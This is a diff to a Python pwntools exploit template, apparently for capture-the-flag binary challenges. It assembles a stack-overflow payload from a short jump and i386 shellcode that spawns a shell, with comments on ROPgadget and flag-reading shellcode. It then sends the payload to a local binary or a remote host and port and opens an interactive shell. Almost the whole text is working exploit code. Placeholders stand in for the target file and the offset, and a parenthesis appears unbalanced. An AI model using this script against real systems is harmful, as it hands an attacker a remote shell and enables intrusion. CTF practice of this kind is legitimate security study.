@@ -1,7 +1,17 @@
-ROPgadget --binary <file>: show all instructions based on address -> looking for jmp(esp is best)
+#ROPgadget --binary <file>: show all instructions based on address -> looking for jmp(esp is best)
+import argparse
 import pwn
 #pwn.asm(pwn.shellcraft.i386.linux.cat("flag.txt") : shellcode for cat flag.txt
 #"\xeb\x<hex num>": short jmp for num
+
+parser = argparse.ArgumentParser()
+parser.add_argument("destination", type=str, choices={"local", "remote"})
+parser.add_argument("--host", "-h", default="", type=str, required=False)
+parser.add_argument("--port", "-p", default=0, type=int, required=False)
+args = parser.parse_args()
+elf = pwn.ELF("<file>")
+
+offset = <offset>
 short_jump = b"\xeb\x08\x90\x90"
 payload = b"".join(
   [
@@ -12,3 +22,25 @@ payload = b"".join(
     pwn.asm(pwn.shellcraft.i386.linux.sh(),
     b"\n"
   ]
+
+with open("payload", "wb") as flip:
+  flip.write(payload)
+
+#g = pwn.gdb.attach(p,   # line for debugging using gdb
+#    gdbscript = """
+#    b *<func>
+#    r < payload
+#""")
+
+
+if args.destination == "local":
+  p = elf.process()
+elif args.destination == "remote":
+  if not args.host or not args.port:
+    pwn.warning("Supply -h for host and -p for port")
+    exit()
+  p = pwn.remote(args.host, args.port)
+
+p.sendline(payload)
+p.interactive()
+
